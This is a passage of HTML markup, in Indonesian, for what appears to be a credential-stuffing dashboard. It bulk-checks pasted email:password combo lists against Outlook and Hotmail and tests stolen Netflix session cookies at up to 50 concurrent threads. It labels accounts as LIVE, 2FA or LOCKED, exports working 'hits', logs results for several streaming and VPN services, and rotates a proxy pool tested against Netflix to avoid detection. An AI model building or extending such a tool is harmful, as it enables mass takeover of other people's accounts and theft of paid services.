        <div style="position:relative;">
          <canvas id="outlook-donut-chart" width="100" height="100"></canvas>
          <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); text-align:center;">
            <span id="outlook-donut-total" style="font-size:20px; font-weight:800; color:var(--text-primary);">0</span>
          </div>
        </div>
        <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; flex:1; min-width:180px;">
          <div style="text-align:center;">
            <div id="outlook-stat-live" style="font-size:22px; font-weight:800; color:#10b981;">0</div>
            <div style="font-size:10px; color:var(--text-muted);">LIVE</div>
          </div>
          <div style="text-align:center;">
            <div id="outlook-stat-2fa" style="font-size:22px; font-weight:800; color:#38bdf8;">0</div>
            <div style="font-size:10px; color:var(--text-muted);">2FA</div>
          </div>
          <div style="text-align:center;">
            <div id="outlook-stat-bad" style="font-size:22px; font-weight:800; color:#f43f5e;">0</div>
            <div style="font-size:10px; color:var(--text-muted);">BAD</div>
          </div>
          <div style="text-align:center;">
            <div id="outlook-stat-locked" style="font-size:22px; font-weight:800; color:#f59e0b;">0</div>
            <div style="font-size:10px; color:var(--text-muted);">LOCKED</div>
          </div>
        </div>
      </div>
      <div style="margin-top:12px;">
        <div style="display:flex; justify-content:space-between; font-size:11px; margin-bottom:4px;">
          <span style="color:var(--text-muted);">Hit Rate</span>
          <span id="outlook-hit-rate" style="font-weight:700; color:var(--primary);">0%</span>
        </div>
        <div style="background:var(--bg-subtle); border-radius:6px; height:6px; overflow:hidden;">
          <div id="outlook-hit-rate-bar" style="height:100%; width:0%; border-radius:6px; transition:width 0.4s; background:linear-gradient(90deg, #10b981, #0078d4);"></div>
        </div>
      </div>
    </div>

    <!-- Bulk Outlook Check -->
    <div class="card" style="padding:16px;">
      <label style="font-size:12px; font-weight:600; margin-bottom:6px; display:block; color:var(--primary);">Bulk Checker</label>
      <textarea id="outlook-bulk-input" placeholder="Paste combo list (email:password per baris)..." style="height:120px;"></textarea>
      <div style="display:flex; align-items:center; gap:8px; margin-top:8px;">
        <button id="outlook-bulk-btn" class="btn-primary" style="flex:2;" onclick="runOutlookBulk()">Mulai Bulk Check</button>
        <button class="btn-secondary" style="flex:1;" onclick="stopOutlookBulk()">⏹ Stop</button>
        <button class="btn-secondary" style="flex:1;" onclick="exportOutlookHits()">📥 Export Hits</button>
        <div id="outlook-bulk-stats" style="font-size:12px; font-weight:600; color:var(--text-muted);"></div>
      </div>
      <div style="display:flex; align-items:center; gap:8px; margin-top:8px;">
        <button class="btn-secondary" style="flex:1;" onclick="exportOutlookAll()">📋 Export All</button>
      </div>
      <div id="outlook-bulk-progress" style="margin-top:8px; display:none;">
        <div style="background:var(--bg-subtle); border-radius:6px; height:6px; overflow:hidden;">
          <div id="outlook-progress-bar" style="background:var(--primary); height:100%; width:0%; transition:width 0.3s;"></div>
        </div>
      </div>
      <div id="outlook-bulk-out" style="max-height:400px; overflow-y:auto; margin-top:12px;"></div>
    </div>
  </div>

  <!-- PANEL 2: BULK -->
  <div id="panel-bulk" class="section-panel">
    <!-- File Bulk Upload Zone -->
    <div id="bulk-drop-zone" style="border:2px dashed var(--border); border-radius:var(--radius-md); padding:20px 16px; text-align:center; margin-bottom:14px; cursor:pointer; transition:all 0.2s ease; background:var(--bg-subtle); position:relative;"
         onclick="document.getElementById('bulk-file-input').click()"
         ondragover="event.preventDefault(); this.style.borderColor='var(--primary)'; this.style.background='rgba(229,9,20,0.08)';"
         ondragleave="this.style.borderColor='var(--border)'; this.style.background='var(--bg-subtle)';"
         ondrop="handleBulkDrop(event)">
      <div style="font-size:30px; margin-bottom:6px;">📁</div>
      <div style="font-size:13px; font-weight:700; color:var(--text-main);">Drag & Drop Cookie Files di Sini</div>
      <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">
        Mendukung <code>.txt</code>, <code>.json</code>, <code>.cookie</code>, <code>.cookies</code> • Format Netscape, JSON Cookie-Editor, Combo List & Multi-File / Folder
      </div>
      <div style="display:flex; justify-content:center; gap:8px; margin-top:12px; flex-wrap:wrap;">
        <button type="button" class="btn-secondary" style="padding:5px 14px; font-size:11.5px; border-radius:var(--radius-sm);" onclick="event.stopPropagation(); document.getElementById('bulk-file-input').click();">
          📄 Pilih File (Multi-select)
        </button>
        <button type="button" class="btn-secondary" style="padding:5px 14px; font-size:11.5px; border-radius:var(--radius-sm);" onclick="event.stopPropagation(); document.getElementById('bulk-folder-input').click();">
          📂 Pilih Folder
        </button>
        <button type="button" id="bulk-clear-files-btn" class="btn-secondary" style="padding:5px 14px; font-size:11.5px; border-radius:var(--radius-sm); display:none; color:var(--dead); border-color:var(--dead-border);" onclick="event.stopPropagation(); clearBulkInput();">
          🗑️ Bersihkan
        </button>
      </div>
      <div id="bulk-file-info" style="font-size:11.5px; color:var(--primary); margin-top:10px; font-weight:600; display:none;"></div>
      <input type="file" id="bulk-file-input" multiple accept=".txt,.json,.cookie,.cookies" style="display:none;" onchange="handleBulkFiles(this.files)">
      <input type="file" id="bulk-folder-input" webkitdirectory directory style="display:none;" onchange="handleBulkFiles(this.files)">
    </div>

    <div style="display:flex; align-items:center; gap:10px; margin-bottom:10px;">
      <div style="flex:1; height:1px; background:var(--border);"></div>
      <span style="font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.5px;">— atau paste manual / edit cookie di bawah —</span>
      <div style="flex:1; height:1px; background:var(--border);"></div>
    </div>

    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
      <div style="display:flex; align-items:center; gap:8px;">
        <label style="margin-bottom:0; font-size:12px; font-weight:600;">Multi-line cookies (1 baris = 1 akun):</label>
        <span id="bulk-input-count" class="badge" style="background:var(--bg-subtle); color:var(--text-muted); font-size:11px;">0 akun</span>
      </div>
      <div style="display:flex; align-items:center; gap:10px;">
        <button type="button" class="btn-secondary" style="padding:2px 8px; font-size:11px;" onclick="clearBulkInput()">Hapus Semua</button>
        <div style="font-size:12px; color:var(--text-muted); display:flex; align-items:center; gap:6px;">
          <span style="font-weight:600;">Threads:</span>
          <select id="bulk-threads" style="width:auto; padding:4px 8px; font-size:12px; border-radius:var(--radius-sm);">
            <option value="3">3 Concurrent</option>
            <option value="5" selected>5 Concurrent</option>
            <option value="10">10 Concurrent</option>
            <option value="15">15 Concurrent</option>
            <option value="20">20 Concurrent</option>
            <option value="30">30 Concurrent</option>
            <option value="50">50 Concurrent</option>
          </select>
        </div>
      </div>
    </div>
    <textarea id="bulk-input" style="height:180px;" placeholder="NetflixId=...&#10;NetflixId=...; SecureNetflixId=...&#10;user:pass | Cookie = NetflixId=...&#10;[{&quot;name&quot;:&quot;NetflixId&quot;,&quot;value&quot;:&quot;...&quot;}]" oninput="updateBulkCount()"></textarea>
    <div class="shortcut-hint">Tekan <kbd>Ctrl</kbd> + <kbd>Enter</kbd> start | <kbd>Esc</kbd> stop</div>
    <div style="display:flex; gap:10px; margin: 8px 0 14px;">
      <button id="bulk-btn" class="btn-primary" style="flex:2;" onclick="runBulk()">Mulai Concurrent Check</button>
      <button class="btn-secondary" style="flex:1; justify-content:center;" onclick="stopBulk()">Stop</button>
    </div>
    <div id="bulk-progress" class="progress-wrap">
      <div style="display:flex; justify-content:space-between; font-size:12px; font-weight:600;">
        <span id="progress-status" style="color:var(--text-muted)">Memeriksa 0/0...</span>
        <span id="progress-percent" style="color:var(--primary)">0%</span>
      </div>
      <div class="progress-bar-bg"><div id="progress-fill" class="progress-bar-fill"></div></div>
    </div>
    <div class="bulk-stats">
      <div class="stat-pill">
        <div class="label">Total</div>
        <div class="num" id="stat-total">0</div>
      </div>
      <div class="stat-pill">
        <div class="label" style="color:var(--live)">Live</div>
        <div class="num" id="stat-live" style="color:var(--live)">0</div>
      </div>
      <div class="stat-pill">
        <div class="label" style="color:var(--hold)">Hold</div>
        <div class="num" id="stat-hold" style="color:var(--hold)">0</div>
      </div>
      <div class="stat-pill">
        <div class="label" style="color:var(--accent-4k)">4K Ultra</div>
        <div class="num" id="stat-4k" style="color:var(--accent-4k)">0</div>
      </div>
      <div class="stat-pill">
        <div class="label" style="color:var(--dead)">Dead</div>
        <div class="num" id="stat-dead" style="color:var(--dead)">0</div>
      </div>
    </div>
    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px; margin-bottom:12px;">
      <div style="display:flex; gap:6px; align-items:center;">
        <span style="font-size:12px; font-weight:600; color:var(--text-muted); margin-right:4px;">Filter:</span>
        <button id="btn-filter-all" class="btn-secondary" style="padding:4px 10px; font-size:11px; background:var(--bg-subtle);" onclick="setBulkFilter('ALL')">Semua</button>
        <button id="btn-filter-live" class="btn-secondary" style="padding:4px 10px; font-size:11px;" onclick="setBulkFilter('LIVE')">Hanya LIVE</button>
        <button id="btn-filter-hold" class="btn-secondary" style="padding:4px 10px; font-size:11px;" onclick="setBulkFilter('HOLD')">HOLD</button>
        <button id="btn-filter-4k" class="btn-secondary" style="padding:4px 10px; font-size:11px;" onclick="setBulkFilter('4K')">4K Ultra</button>
        <button id="btn-filter-dead" class="btn-secondary" style="padding:4px 10px; font-size:11px;" onclick="setBulkFilter('DEAD')">DEAD</button>
      </div>
      <div style="display:flex; gap:8px;">
        <button class="btn-secondary" onclick="exportBulk('txt', 'LIVE')">Export Live (TXT)</button>
        <button class="btn-secondary" style="color:var(--hold); border-color:var(--hold-border);" onclick="exportBulk('txt', 'HOLD')">Export Hold (TXT)</button>
        <button class="btn-secondary" onclick="exportBulk('json')">Export Live (JSON)</button>
      </div>
    </div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr><th>#</th><th>Status</th><th>Plan</th><th>Billing</th><th>Country</th><th>Links</th><th>Route</th></tr>
        </thead>
        <tbody id="bulk-tbody"></tbody>
      </table>
    </div>
  </div>

  <!-- PANEL 3: HISTORY -->
  <div id="panel-history" class="section-panel">
    <div class="filter-row">
      <input type="text" id="hist-search" placeholder="Cari email / negara / plan..." oninput="onSearchInput()" style="flex:2; margin-bottom:0;">
      <select id="hist-filter-type" onchange="resetPageAndLoad()" style="flex:1; margin-bottom:0;">
        <option value="">Semua Service</option>
        <option value="checker">🔴 Netflix</option>
        <option value="disney">🟢 Disney+</option>
        <option value="crunchyroll">🟠 Crunchyroll</option>
        <option value="expressvpn">🟢 ExpressVPN</option>
        <option value="spotify">🟢 Spotify</option>
        <option value="outlook">🔵 Outlook</option>
        <option value="hotmail">🔵 Hotmail</option>
      </select>
      <select id="hist-filter-status" onchange="resetPageAndLoad()" style="flex:1; margin-bottom:0;">
        <option value="">Semua Status</option>
        <option value="LIVE">Hanya LIVE</option>
        <option value="HOLD">Hanya HOLD</option>
        <option value="FREE">Hanya FREE</option>
        <option value="DEAD">Hanya DEAD</option>
        <option value="BAD">Hanya BAD</option>
        <option value="PREMIUM">Hanya PREMIUM</option>
        <option value="TRIAL">Hanya TRIAL</option>
        <option value="2FA">Hanya 2FA</option>
        <option value="LOCKED">Hanya LOCKED</option>
        <option value="PHONE_LOCKED">Hanya PHONE LOCKED</option>
        <option value="ERROR">Hanya ERROR</option>
      </select>
      <select id="hist-filter-plan" onchange="resetPageAndLoad()" style="flex:1; margin-bottom:0;">
        <option value="">Semua Plan</option>
        <optgroup label="Netflix">
          <option value="PREMIUM">Premium (4K UHD)</option>
          <option value="STANDARD">Standard</option>
          <option value="BASIC">Basic</option>
          <option value="MOBILE">Mobile</option>
        </optgroup>
        <optgroup label="Spotify">
          <option value="FAMILY">Family / Duo</option>
          <option value="STUDENT">Student</option>
        </optgroup>
        <optgroup label="Lainnya">
          <option value="DISNEY">Disney+</option>
          <option value="CRUNCHYROLL">Crunchyroll</option>
          <option value="EXPRESSVPN">ExpressVPN</option>
        </optgroup>
        <optgroup label="Outlook / Hotmail">
          <option value="Outlook Valid">Outlook Valid</option>
          <option value="Hotmail Valid">Hotmail Valid</option>
          <option value="Outlook 2FA">Outlook 2FA</option>
          <option value="Hotmail 2FA">Hotmail 2FA</option>
          <option value="Outlook Phone Locked">Outlook Phone Locked</option>
          <option value="Hotmail Phone Locked">Hotmail Phone Locked</option>
        </optgroup>
      </select>
      <button class="btn-secondary" onclick="exportCsvWithAuth()">Export CSV</button>
      <button class="btn-secondary" onclick="loadHistory()">Refresh</button>
      <button class="btn-secondary" style="color:#f59e0b; border-color:rgba(245,158,11,0.3);" onclick="clearDbHistory(true)">Hapus DEAD/BAD/LOCKED</button>
      <button class="btn-secondary" style="color:var(--dead); border-color:var(--dead-border);" onclick="clearDbHistory(false)">Hapus Semua</button>
    </div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr><th>Waktu</th><th>Service</th><th>Status</th><th>Email / Cookie</th><th>Plan</th><th>Billing</th><th>Country</th><th>Aksi</th></tr>
        </thead>
        <tbody id="history-tbody"></tbody>
      </table>
    </div>
    <div class="pagination-bar">
      <div>Menampilkan <span id="pag-start" style="color:#fff; font-weight:600;">0</span>-<span id="pag-end" style="color:#fff; font-weight:600;">0</span> dari <span id="pag-total" style="color:#fff; font-weight:600;">0</span> entri</div>
      <div style="display:flex; gap:8px; align-items:center;">
        <button class="btn-secondary" id="btn-prev" onclick="prevPage()">Prev</button>
        <span id="page-num" style="font-weight:600;">Halaman 1</span>
        <button class="btn-secondary" id="btn-next" onclick="nextPage()">Next</button>
      </div>
    </div>
  </div>


  <!-- PANEL 5: ANALYTICS -->
  <div id="panel-analytics" class="section-panel">
    <div style="font-size:13px; color:var(--text-muted); margin-bottom:12px;">Visualisasi ringkasan akun dan performa riwayat pengecekan SQLite.</div>
    <div class="chart-grid">
      <div class="chart-card">
        <label>Perbandingan Status (Live vs Dead)</label>
        <canvas id="chart-status" height="200"></canvas>
      </div>
      <div class="chart-card">
        <label>Distribusi Paket Akun (LIVE)</label>
        <canvas id="chart-plan" height="200"></canvas>
      </div>
      <div class="chart-card" style="grid-column: 1 / -1;">
        <label>Distribusi Akun per Negara</label>
        <canvas id="chart-country" height="200"></canvas>
      </div>
    </div>
  </div>

  <!-- PANEL: PROXY MANAGER -->
  <div id="panel-proxymanager" class="section-panel">
    <!-- Header Ribbon -->
    <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:16px; flex-wrap:wrap; gap:12px;">
      <div>
        <h2 style="font-size:20px; font-weight:800; display:flex; align-items:center; gap:10px; margin-bottom:4px;">
          <span style="display:inline-flex; align-items:center; justify-content:center; width:32px; height:32px; border-radius:8px; background:linear-gradient(135deg, rgba(37,99,235,0.2), rgba(124,58,237,0.2)); border:1px solid rgba(59,130,246,0.3); font-size:16px;">🌐</span>
          <span>Proxy Manager Hub</span>
          <span class="badge" style="background:linear-gradient(135deg, #1e1b4b, #312e81); color:#a5b4fc; font-size:10px; border:1px solid rgba(129,140,248,0.3);">⚡ 80x MULTI-THREAD</span>
          <span class="badge" style="background:#064e3b; color:#6ee7b7; font-size:10px; border:1px solid rgba(52,211,153,0.3);">AUTO-FAILOVER</span>
        </h2>
        <div style="font-size:12.5px; color:var(--text-muted);">
          Kelola pool proxy, uji latensi ultra-cepat ke Netflix gateway, dan bersihkan dead proxy secara real-time.
        </div>
      </div>
      <div style="display:flex; gap:8px;">
        <button class="btn btn-sm" onclick="pmRefresh(true)" style="background:var(--bg-subtle); border:1px solid var(--border); font-weight:600; display:inline-flex; align-items:center; gap:6px;">
          <span>↻</span> Refresh Pool
        </button>
        <button class="btn btn-sm" onclick="pmToggleAddBox()" style="background:linear-gradient(135deg, #2563eb, #1d4ed8); color:#fff; border:0; font-weight:700; display:inline-flex; align-items:center; gap:6px; box-shadow:0 2px 8px rgba(37,99,235,0.35);">
          <span>➕</span> Import / Tambah Proxy
        </button>
      </div>
    </div>

    <!-- 4 Sleek Glassmorphism Stat Cards -->
    <div class="pm-stat-grid">
      <!-- Total Pool -->
      <div class="pm-stat-box" style="border-left:3px solid #3b82f6;">
        <div class="stat-icon">🌐</div>
        <div>
          <div class="stat-title">Total Proxy Pool</div>
          <div class="stat-val" id="pm-total" style="color:var(--text-main);">0</div>
        </div>
        <div class="stat-meta" id="pm-meta-total">Tersedia di netflix_proxies.txt</div>
      </div>

      <!-- Healthy / Live -->
      <div class="pm-stat-box" style="border-left:3px solid var(--live);">
        <div class="stat-icon">🟢</div>
        <div>
          <div class="stat-title" style="color:var(--live);">Proxy Live (Verified)</div>
          <div class="stat-val" id="pm-healthy" style="color:var(--live);">0</div>
        </div>
        <div class="stat-meta" id="pm-meta-healthy">0% pool siap pakai • Latensi: -</div>
      </div>

      <!-- Ready / Unverified -->
      <div class="pm-stat-box" style="border-left:3px solid #eab308;">
        <div class="stat-icon">⏳</div>
        <div>
          <div class="stat-title" style="color:#eab308;">Ready / Belum Diuji</div>
          <div class="stat-val" id="pm-unverified" style="color:#eab308;">0</div>
        </div>
        <div class="stat-meta" id="pm-meta-unverified">Siap dirotasi &amp; diuji</div>
      </div>

      <!-- Dead / Offline -->
      <div class="pm-stat-box" style="border-left:3px solid var(--dead);">
        <div class="stat-icon">🔴</div>
        <div>
          <div class="stat-title" style="color:var(--dead);">Dead / Offline</div>
          <div class="stat-val" id="pm-dead" style="color:var(--dead);">0</div>
        </div>
        <div class="stat-meta" id="pm-meta-dead">Gagal koneksi atau timeout</div>
      </div>
    </div>

    <!-- Ultra-Fast Batch Tester Card -->
    <div class="pm-tester-box">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; flex-wrap:wrap; gap:8px;">
        <div style="display:flex; align-items:center; gap:8px;">
          <span style="font-size:16px;">⚡</span>
          <span style="font-size:13px; font-weight:700; color:#fff;">Ultra-Fast Concurrent Batch Tester</span>
          <span class="badge" style="background:rgba(59,130,246,0.15); color:#60a5fa; border:1px solid rgba(59,130,246,0.3); font-size:10.5px;">80 Concurrent Workers</span>
        </div>
        <div style="font-size:11.5px; color:var(--text-muted);">
          Target Uji: <code style="color:#93c5fd; background:rgba(15,23,42,0.6); padding:2px 6px; border-radius:4px;">netflix.com (Favicon/Handshake)</code>
        </div>
      </div>

      <div style="display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:12px; background:rgba(15,23,42,0.45); padding:12px; border-radius:8px; border:1px solid rgba(255,255,255,0.06); margin-bottom:12px;">
        <!-- Mode Filter -->
        <div style="display:flex; align-items:center; gap:6px; flex-wrap:wrap;">
          <span style="font-size:11px; font-weight:600; color:var(--text-muted); margin-right:4px;">MODE:</span>
          <button type="button" class="pm-pill-btn active" id="pm-mode-untested" onclick="pmSetTestMode('untested')">⚡ Untested Saja</button>
          <button type="button" class="pm-pill-btn" id="pm-mode-all" onclick="pmSetTestMode('all')">🔄 Semua Proxy</button>
          <button type="button" class="pm-pill-btn" id="pm-mode-dead" onclick="pmSetTestMode('dead')">💀 Retest Dead</button>
        </div>

        <!-- Presets -->
        <div style="display:flex; align-items:center; gap:6px; flex-wrap:wrap;">
          <span style="font-size:11px; font-weight:600; color:var(--text-muted); margin-right:4px;">JUMLAH:</span>
          <button type="button" class="pm-pill-btn" id="pm-limit-50" onclick="pmSetBatchLimit(50)">50</button>
          <button type="button" class="pm-pill-btn active" id="pm-limit-100" onclick="pmSetBatchLimit(100)">100</button>
          <button type="button" class="pm-pill-btn" id="pm-limit-250" onclick="pmSetBatchLimit(250)">250</button>
          <button type="button" class="pm-pill-btn" id="pm-limit-500" onclick="pmSetBatchLimit(500)">500</button>
          <button type="button" class="pm-pill-btn" id="pm-limit-1000" onclick="pmSetBatchLimit(1000)">1.000</button>
          <button type="button" class="pm-pill-btn" id="pm-limit-all" onclick="pmSetBatchLimit('all')">Semua</button>
          <input type="number" id="pm-custom-limit" placeholder="Kustom" min="1" max="10000" oninput="pmOnCustomLimitInput(this.value)" style="width:75px; background:var(--bg-input); border:1px solid var(--border); color:#fff; border-radius:20px; padding:3px 10px; font-size:11px; text-align:center;">
        </div>

        <!-- Run / Stop Actions -->
        <div style="display:flex; gap:8px; align-items:center;">
          <button type="button" class="pm-run-btn" id="pm-btn-start-test" onclick="pmStartBatchTest()">
            <span>🚀</span> Mulai Test Batch
          </button>
          <button type="button" class="pm-stop-btn" id="pm-btn-stop-test" onclick="pmStopBatchTest()" style="display:none;">
            <span>⏹</span> Hentikan Test
          </button>
        </div>
      </div>

      <!-- Test Progress & Telemetry Ribbon -->
      <div id="pm-test-progress-box" style="display:none; background:rgba(15,23,42,0.7); border:1px solid rgba(59,130,246,0.3); border-radius:8px; padding:12px;">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; font-size:12px;">
          <div style="display:flex; align-items:center; gap:8px;">
            <span class="pulse-dot" style="display:inline-block; width:8px; height:8px; border-radius:50%; background:#3b82f6; box-shadow:0 0 8px #3b82f6;"></span>
            <span id="pm-progress-title" style="font-weight:700; color:#fff;">Menguji Proxy di Background...</span>
          </div>
          <div id="pm-progress-pct" style="font-family:'JetBrains Mono', monospace; font-weight:700; color:#60a5fa;">0%</div>
        </div>
        
        <!-- Animated Progress Bar -->
        <div style="width:100%; height:8px; background:rgba(255,255,255,0.06); border-radius:6px; overflow:hidden; margin-bottom:10px;">
          <div id="pm-progress-bar-inner" class="pm-progress-stripe" style="width:0%; height:100%; background:linear-gradient(90deg, #2563eb, #10b981); transition:width 0.3s ease;"></div>
        </div>

        <!-- Telemetry Stats -->
        <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(110px, 1fr)); gap:8px; font-size:11px;">
          <div style="background:rgba(255,255,255,0.03); padding:6px 10px; border-radius:6px; border:1px solid rgba(255,255,255,0.05);">
            <div style="color:var(--text-muted);">Diuji</div>
            <div id="pm-tele-tested" style="font-weight:700; font-size:12px; color:#fff;">0 / 0</div>
          </div>
          <div style="background:rgba(16,185,129,0.08); padding:6px 10px; border-radius:6px; border:1px solid rgba(16,185,129,0.2);">
            <div style="color:#34d399;">🟢 Live</div>
            <div id="pm-tele-healthy" style="font-weight:700; font-size:12px; color:#34d399;">0</div>
          </div>
          <div style="background:rgba(244,63,94,0.08); padding:6px 10px; border-radius:6px; border:1px solid rgba(244,63,94,0.2);">
            <div style="color:#fb7185;">🔴 Dead</div>
            <div id="pm-tele-dead" style="font-weight:700; font-size:12px; color:#fb7185;">0</div>
          </div>
          <div style="background:rgba(59,130,246,0.08); padding:6px 10px; border-radius:6px; border:1px solid rgba(59,130,246,0.2);">
            <div style="color:#60a5fa;">⚡ Kecepatan</div>
            <div id="pm-tele-speed" style="font-weight:700; font-size:12px; color:#60a5fa;">0 req/s</div>
          </div>
          <div style="background:rgba(234,179,8,0.08); padding:6px 10px; border-radius:6px; border:1px solid rgba(234,179,8,0.2);">
            <div style="color:#fde047;">⏳ Sisa Waktu</div>
            <div id="pm-tele-eta" style="font-weight:700; font-size:12px; color:#fde047;">~0s</div>
          </div>
        </div>
      </div>
    </div>

    <!-- Quick Action Toolbar -->
    <div style="display:flex; gap:8px; margin-bottom:16px; flex-wrap:wrap; align-items:center;">
      <button class="btn btn-sm" onclick="pmClearDead()" style="background:rgba(220,38,38,0.15); color:#fca5a5; border:1px solid rgba(220,38,38,0.3); font-size:11.5px; font-weight:600; padding:6px 12px; border-radius:6px;">
        🧹 Hapus Proxy Dead
      </button>
      <button class="btn btn-sm" onclick="pmClearAll()" style="background:rgba(153,27,27,0.12); color:#f87171; border:1px solid rgba(153,27,27,0.35); font-size:11.5px; font-weight:600; padding:6px 12px; border-radius:6px;">
        ⚠️ Kosongkan Pool
      </button>
      <div style="flex:1;"></div>
      <button class="btn btn-sm" onclick="pmExportHealthy()" style="background:rgba(16,185,129,0.15); color:#34d399; border:1px solid rgba(16,185,129,0.3); font-size:11.5px; font-weight:600; padding:6px 12px; border-radius:6px;">
        📥 Export Live (.txt)
      </button>
      <button class="btn btn-sm" onclick="pmCopyHealthy()" style="background:rgba(99,102,241,0.15); color:#a5b4fc; border:1px solid rgba(99,102,241,0.3); font-size:11.5px; font-weight:600; padding:6px 12px; border-radius:6px;">
        📋 Salin Live
      </button>
      <button class="btn btn-sm" onclick="pmReplaceAll()" style="background:rgba(255,255,255,0.06); color:#cbd5e1; border:1px solid var(--border); font-size:11.5px; font-weight:600; padding:6px 12px; border-radius:6px;">
        📝 Ganti Semua (Replace)
      </button>
    </div>

    <!-- Add Proxies Collapsible Card -->
    <div id="pm-add-box" class="pm-card" style="display:none; margin-bottom:16px; border:1px solid rgba(59,130,246,0.35); background:linear-gradient(180deg, rgba(21,24,33,0.95), rgba(15,23,42,0.95));">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
        <label style="font-weight:700; font-size:13px; display:flex; align-items:center; gap:8px;">
          <span>➕ Import &amp; Tambah Proxy ke Pool</span>
          <span id="pm-input-count" style="font-size:11px; color:var(--text-muted); font-weight:normal;">(0 baris)</span>
        </label>
        <div style="display:flex; gap:8px; align-items:center;">
          <input type="file" id="pm-file-input" accept=".txt,.csv" style="display:none;" onchange="pmOnFileSelected(event)">
          <button class="btn btn-sm" onclick="document.getElementById('pm-file-input').click()" style="background:#1e3a8a; border:1px solid #3b82f6; color:#93c5fd; font-size:11px; padding:4px 10px; border-radius:6px;">📁 Upload File .txt</button>
          <button onclick="pmToggleAddBox()" style="background:transparent; border:0; color:var(--text-muted); cursor:pointer; font-size:16px; padding:2px 6px;">✕</button>
        </div>
      </div>
      <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:6px; margin-bottom:10px; font-size:11px;">
        <div style="display:flex; gap:6px; flex-wrap:wrap;">
          <span class="badge" style="background:#1e293b; color:#94a3b8;">Format Didukung:</span>
          <span class="badge" style="background:#0f172a; color:#94a3b8;">IP:PORT</span>
          <span class="badge" style="background:#0f172a; color:#94a3b8;">IP:PORT:USER:PASS</span>
          <span class="badge" style="background:#0f172a; color:#94a3b8;">http://user:pass@ip:port</span>
          <span class="badge" style="background:#0f172a; color:#94a3b8;">socks5://ip:port</span>
        </div>
        <a href="javascript:void(0)" onclick="pmInsertSampleProxies()" style="color:#60a5fa; text-decoration:none; font-size:11px; font-weight:600;">+ Masukkan Contoh Format</a>
      </div>
      <textarea id="pm-add-input" oninput="pmUpdateInputCount()" placeholder="Paste list proxy di sini (satu per baris)...&#10;Contoh:&#10;103.145.22.10:8080&#10;192.168.1.1:3128:user:pass&#10;http://usr:pwd@103.90.10.5:8080" style="width:100%; min-height:120px; background:var(--bg-input); color:var(--text-main); border:1px solid var(--border); border-radius:8px; padding:10px; font-family:'JetBrains Mono', monospace; font-size:12px; resize:vertical;"></textarea>
      <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px;">
        <span id="pm-add-status" style="font-size:12px; color:var(--text-muted);"></span>
        <div style="display:flex; gap:8px;">
          <button class="btn btn-sm" onclick="pmToggleAddBox()" style="background:var(--bg-subtle); border:1px solid var(--border);">Batal</button>
          <button class="btn btn-sm" onclick="pmAddProxies()" style="background:linear-gradient(135deg, #2563eb, #1d4ed8); color:#fff; border:0; font-weight:700; padding:6px 14px; border-radius:6px;">Tambah ke Pool</button>
        </div>
      </div>
    </div>

    <!-- Proxy Table Card -->
    <div class="pm-card" style="padding:16px;">
      <!-- Table Filters & Search -->
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; flex-wrap:wrap; gap:10px;">
        <!-- Status Filter Pills -->
        <div style="display:flex; gap:6px; flex-wrap:wrap;" id="pm-filter-buttons">
          <button class="btn btn-sm pm-filter-btn" data-status="ALL" onclick="pmSetStatusFilter('ALL')" style="font-size:11px; padding:5px 12px; background:var(--accent); color:#fff; border-radius:20px;">Semua (<span id="pm-badge-all">0</span>)</button>
          <button class="btn btn-sm pm-filter-btn" data-status="LIVE" onclick="pmSetStatusFilter('LIVE')" style="font-size:11px; padding:5px 12px; background:var(--bg-subtle); color:var(--text-muted); border-radius:20px;">🟢 Live (<span id="pm-badge-live">0</span>)</button>
          <button class="btn btn-sm pm-filter-btn" data-status="UNVERIFIED" onclick="pmSetStatusFilter('UNVERIFIED')" style="font-size:11px; padding:5px 12px; background:var(--bg-subtle); color:var(--text-muted); border-radius:20px;">⏳ Ready (<span id="pm-badge-unverified">0</span>)</button>
          <button class="btn btn-sm pm-filter-btn" data-status="DEAD" onclick="pmSetStatusFilter('DEAD')" style="font-size:11px; padding:5px 12px; background:var(--bg-subtle); color:var(--text-muted); border-radius:20px;">🔴 Dead (<span id="pm-badge-dead">0</span>)</button>
        </div>

        <div style="display:flex; gap:8px; align-items:center;">
          <!-- Limit selector -->
          <select id="pm-limit-select" onchange="pmChangeLimit(this.value)" style="background:var(--bg-input); color:var(--text-main); border:1px solid var(--border); border-radius:6px; padding:5px 8px; font-size:11.5px;">
            <option value="25">25 / hal</option>
            <option value="50" selected>50 / hal</option>
            <option value="100">100 / hal</option>
            <option value="250">250 / hal</option>
          </select>
          <!-- Search box -->
          <input type="text" id="pm-search" placeholder="Cari IP, Port, Protokol..." oninput="pmSearch(this.value)" style="background:var(--bg-input); color:var(--text-main); border:1px solid var(--border); border-radius:6px; padding:5px 10px; font-size:12px; width:190px;">
        </div>
      </div>

      <!-- Table Wrap -->
      <div class="table-wrap" style="max-height:480px; overflow-y:auto; border:1px solid var(--border); border-radius:8px;">
        <table class="pm-table">
          <thead>
            <tr>
              <th style="width:36px; text-align:center;"><input type="checkbox" id="pm-select-all" onchange="pmToggleSelectAll(this)"></th>
              <th>Proxy Endpoint</th>
              <th>Protokol</th>
              <th>Status Netflix</th>
              <th>Latensi</th>
              <th style="text-align:right;">Aksi</th>
            </tr>
          </thead>
          <tbody id="pm-tbody">
            <tr><td colspan="6" style="text-align:center; padding:30px; color:var(--text-muted);">Memuat proxy data...</td></tr>
          </tbody>
        </table>
      </div>

      <!-- Table Batch Bar & Pagination -->
      <div style="display:flex; justify-content:space-between; align-items:center; margin-top:12px; flex-wrap:wrap; gap:8px;">
        <div style="display:flex; gap:8px; align-items:center;">
